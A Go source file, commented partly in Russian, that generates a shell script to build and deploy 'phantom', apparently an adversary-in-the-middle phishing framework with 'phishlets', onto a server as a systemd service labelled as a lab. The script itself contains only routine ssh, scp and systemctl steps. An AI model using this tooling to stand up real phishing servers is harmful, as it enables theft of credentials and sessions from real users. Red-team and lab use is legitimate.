// Package deploy — automated server deployment (Pro-паритет).
// Генерирует рабочий deploy.sh: build -> scp binary+config+phishlets ->
// ssh systemd unit + restart. Только key-auth, паролей нет.
package deploy

import (
	"fmt"
	"os"
)

func Script(ip, user, keyPath, domain string) string {
	return fmt.Sprintf(`#!/bin/sh
set -eu
# phantom deploy to %s@%s domain=%s (key-only, no passwords)
DST=%s@%s
KEY=%s
go build -o phantom ./cmd/phantom
ssh -i "$KEY" "$DST" 'mkdir -p /opt/phantom/certs /opt/phantom/data /opt/phantom/phishlets'
scp -i "$KEY" ./phantom "$DST:/opt/phantom/phantom"
scp -i "$KEY" ./config.yaml.example "$DST:/opt/phantom/config.yaml"
scp -i "$KEY" ./configs/phishlets/*.yaml "$DST:/opt/phantom/phishlets/"
ssh -i "$KEY" "$DST" 'cat > /etc/systemd/system/phantom.service <<EOF
[Unit]
Description=Phantom v2 AiTM lab
After=network.target
[Service]
ExecStart=/opt/phantom/phantom -config /opt/phantom/config.yaml -phishlets /opt/phantom/phishlets
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable --now phantom && systemctl status phantom --no-pager'
`, user, ip, domain, user, ip, keyPath)
}

func Write(path, content string) error {
	return os.WriteFile(path, []byte(content), 0o750)
}
